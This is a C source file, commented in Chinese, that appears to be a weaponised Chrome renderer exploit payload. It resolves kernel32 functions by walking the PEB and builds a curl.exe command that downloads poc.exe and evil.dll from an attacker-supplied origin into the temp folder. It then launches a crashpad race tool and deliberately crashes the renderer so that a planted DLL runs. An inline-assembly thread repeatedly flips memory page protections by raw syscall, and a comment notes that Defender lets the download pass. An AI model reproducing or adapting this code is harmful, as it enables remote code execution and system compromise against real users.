/* payload_src_w4.c — 武器化 v4：curl.exe 落地方案。
 * 零 DLL 加载、零页面内嵌大字节、原版 10-pad 模块不动（保基线成功率）。
 * JS 把 location.origin 注入 g_origin 洞；payload 用 kernel32 已加载导出：
 *   1) curl.exe 一次性下载 poc.exe+evil.dll 到 %TEMP%（Defender 实测放行）
 *   2) WaitForSingleObject 等下载完成
 *   3) 直接 CreateProcessA 启动 ms64.exe 竞态器（无 cmd.exe、无 certutil）
 * 渲染器随后自然崩溃 → crashpad 竞态 → plant → evil.dll → calc。 */
typedef unsigned long long u64;
typedef long long i64;
typedef int i32;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

__attribute__((naked, used)) static void flip_thread(void) {
  __asm__ volatile(
      "movabsq $0x10201000, %r10\n\t"
      "1:\n\t"
      "movq %r10, %r11\n\t"
      "2:\n\t"
      "movq (%r11), %rax\n\t"
      "testq %rax, %rax\n\t"
      "jz 1b\n\t"
      "subq $0x48, %rsp\n\t"
      "movq %rax, 0x30(%rsp)\n\t"
      "movq $0x1000, 0x38(%rsp)\n\t"
      "movl $0, 0x40(%rsp)\n\t"
      "movq $-1, %rcx\n\t"
      "leaq 0x30(%rsp), %rdx\n\t"
      "leaq 0x38(%rsp), %r9\n\t"
      "movl $1, %r8d\n\t"
      "leaq 0x40(%rsp), %rax\n\t"
      "movq %rax, 0x28(%rsp)\n\t"
      "movl $80, %eax\n\t"
      "movq %rcx, %r10\n\t"
      "syscall\n\t"
      "movq $0x1000, 0x38(%rsp)\n\t"
      "movq $-1, %rcx\n\t"
      "leaq 0x30(%rsp), %rdx\n\t"
      "leaq 0x38(%rsp), %r9\n\t"
      "movl $4, %r8d\n\t"
      "leaq 0x40(%rsp), %rax\n\t"
      "movq %rax, 0x28(%rsp)\n\t"
      "movl $80, %eax\n\t"
      "movq %rcx, %r10\n\t"
      "syscall\n\t"
      "addq $0x48, %rsp\n\t"
      "addq $8, %r11\n\t"
      "pause\n\t"
      "jmp 2b\n\t");
}
__attribute__((naked, used)) static void flip_end_marker(void) {}
__attribute__((used, section(".text"))) static const unsigned char g_pad[0x98] = {0x90};

/* 偏移(含NUL): GetTempPathA@0 CreateDirectoryA@13 GetModuleFileNameA@30
 *   CreateProcessA@49 WaitForSingleObject@64 end@84 */
__attribute__((used, section(".text"))) static const char g_names[] =
  "GetTempPathA\0CreateDirectoryA\0GetModuleFileNameA\0"
  "CreateProcessA\0WaitForSingleObject\0";
__attribute__((used, section(".text"))) const char g_origin[72] = {'h','t','t','p',0};
__attribute__((used, section(".text"))) static const char g_c1[] = "curl.exe -sf -o \"";
__attribute__((used, section(".text"))) static const char g_c2[] = "/poc.exe -o \"";
__attribute__((used, section(".text"))) static const char g_c3[] = "/evil.dll\"";
__attribute__((used, section(".text"))) static const char g_m1[] = "ms64.exe";
__attribute__((used, section(".text"))) static const char g_m2[] = "ev64.dll";
__attribute__((used, section(".text"))) static const char g_m3[] = "msdb";
__attribute__((used, section(".text"))) static const char g_m4[] = " --handler \"";
__attribute__((used, section(".text"))) static const char g_m5[] = "\" --db \"";
__attribute__((used, section(".text"))) static const char g_suf[] =
  "msdb\" --mode race --iters 8 --pages 41 --calc --dbg";
__attribute__((used, section(".text"))) static const char g_q[] = "\" ";
__attribute__((used, section(".text"))) static const char g_q1[] = "\"";

static __attribute__((always_inline)) inline char* acat(char* d, const char* s) { while (*s) *d++ = *s++; return d; }
static __attribute__((always_inline)) inline char* acat_v(char* d, volatile const char* s) { while (*s) *d++ = *s++; return d; }

static __attribute__((always_inline)) inline int name_eq(volatile const char* e, const char* w) {
  while (*w) { if (*e++ != *w++) return 0; }
  return *e == 0;
}
static __attribute__((always_inline)) inline u64 find_export(u64 mod, const char* want) {
  u32 lfa = *(volatile u32*)(mod + 0x3C);
  volatile u32* pe = (volatile u32*)(mod + lfa);
  if (pe[0] != 0x00004550u) return 0;
  volatile u32* opt = (volatile u32*)((char*)pe + 0x18);
  u32 expRva = *(volatile u32*)((char*)opt + 0x70);
  if (!expRva) return 0;
  volatile u32* exp = (volatile u32*)(mod + expRva);
  u32 nNames = exp[6]; u32 funcsRva = exp[7]; u32 namesRva = exp[8]; u32 ordsRva = exp[9];
  volatile u32* names = (volatile u32*)(mod + namesRva);
  volatile u32* funcs = (volatile u32*)(mod + funcsRva);
  volatile u16* ords  = (volatile u16*)(mod + ordsRva);
  for (u32 i = 0; i < nNames && i < 4096; i++) {
    if (name_eq((volatile const char*)(mod + names[i]), want)) return mod + funcs[ords[i]];
  }
  return 0;
}

__attribute__((noinline, used)) void payload_main(void) {
  u64 peb;
  __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
  u64 base = *(volatile u64*)(peb + 0x10);
  u64 llw  = *(volatile u64*)(base + 0x3BE4B8);
  if (llw < 0x10000 || llw > 0x7ffe00000000ull) return;
  u64 k32 = llw & ~0xFFFull;
  int ok = 0;
  for (int i = 0; i < 512; i++, k32 -= 0x1000ull) {
    if (*(volatile u16*)k32 == 0x5A4Du) {
      u32 lfa2 = *(volatile u32*)(k32 + 0x3C);
      if (lfa2 < 0x400 && *(volatile u32*)(k32 + lfa2) == 0x00004550u) { ok = 1; break; }
    }
  }
  if (!ok) return;
  u64 pTmp = find_export(k32, g_names);             /* GetTempPathA       @0  */
  u64 pCD  = find_export(k32, g_names + 13);        /* CreateDirectoryA   @13 */
  u64 pGMF = find_export(k32, g_names + 30);        /* GetModuleFileNameA @30 */
  u64 pCP  = find_export(k32, g_names + 49);        /* CreateProcessA     @49 */
  u64 pWFS = find_export(k32, g_names + 64);        /* WaitForSingleObject@64 */
  if (!pTmp || !pCD || !pGMF || !pCP || !pWFS) return;
  u32  (*GetTempPathA)(u32, char*) = (void*)pTmp;
  u32  (*GetModuleFileNameA)(void*, char*, u32) = (void*)pGMF;
  int  (*CreateProcessA)(const char*, char*, void*, void*, int, u32, void*, const char*, void*, void*) = (void*)pCP;
  int  (*CreateDirectoryA)(const char*, void*) = (void*)pCD;
  u32  (*WaitForSingleObject)(void*, u32) = (void*)pWFS;

  volatile char* org = g_origin;      /* volatile：读 JS 注入的值，防折叠 */
  if (org[0] != 'h' || org[1] != 't' || org[2] != 't' || org[3] != 'p') return;
  for (int i = 4; i < 70; i++) { if (!org[i]) { if (i < 8) return; break; } if (i == 69) return; }

  char tmp[300];
  if (GetTempPathA(276, tmp) == 0) return;

  /* 1) curl 一次拉两个文件 */
  char cmd[900];
  char* d = cmd;
  d = acat(d, g_c1);                 /* curl.exe -sf -o " */
  d = acat(d, tmp); d = acat(d, g_m1);
  d = acat(d, g_q1); *d++ = ' ';     /* "  */
  d = acat_v(d, org);                /* http://host:port */
  d = acat(d, g_c2);                 /* /poc.exe -o " */
  d = acat(d, tmp); d = acat(d, g_m2);
  d = acat(d, g_q1); *d++ = ' ';
  d = acat_v(d, org);
  d = acat(d, g_c3);                 /* /evil.dll" */
  *d = 0;

  char si[104], pi[24];
  for (int i = 0; i < 104; i++) si[i] = 0;
  *(u32*)si = 68;
  for (int i = 0; i < 24; i++) pi[i] = 0;
  void** pih = (void**)pi;           /* pi.hProcess @ +0 */
  if (!CreateProcessA(0, cmd, 0, 0, 0, 0, 0, tmp, (void*)si, (void*)pi)) return;
  WaitForSingleObject(*pih, 30000);

  /* 2) msdb 目录 */
  char path[600];
  d = path; d = acat(d, tmp); d = acat(d, g_m3); *d = 0;
  CreateDirectoryA(path, 0);

  /* 3) 启动竞态器 */
  char chrome[1044];
  if (GetModuleFileNameA(0, chrome, 1040) == 0) return;
  d = cmd;
  *d++ = '"';
  d = acat(d, tmp); d = acat(d, g_m1);
  *d++ = '"';
  d = acat(d, g_m4);                 /*  --handler " */
  d = acat(d, chrome);
  d = acat(d, g_m5);                 /* " --db " */
  d = acat(d, tmp); d = acat(d, g_suf);
  *d = 0;
  for (int i = 0; i < 24; i++) pi[i] = 0;
  CreateProcessA(0, cmd, 0, 0, 0, 0, 0, tmp, (void*)si, (void*)pi);

  /* 自旋 ~1s 让竞态器完成布防（原生代码期间 V8 暂停、无 GC 干扰），
   * 然后主动崩溃渲染器——给 crashpad 竞态一个确定性的起跑信号 */
  for (volatile u64 k = 0; k < 1500000000ull; k++) {}
  *(volatile int*)0xDEAD0021 = 0;
}
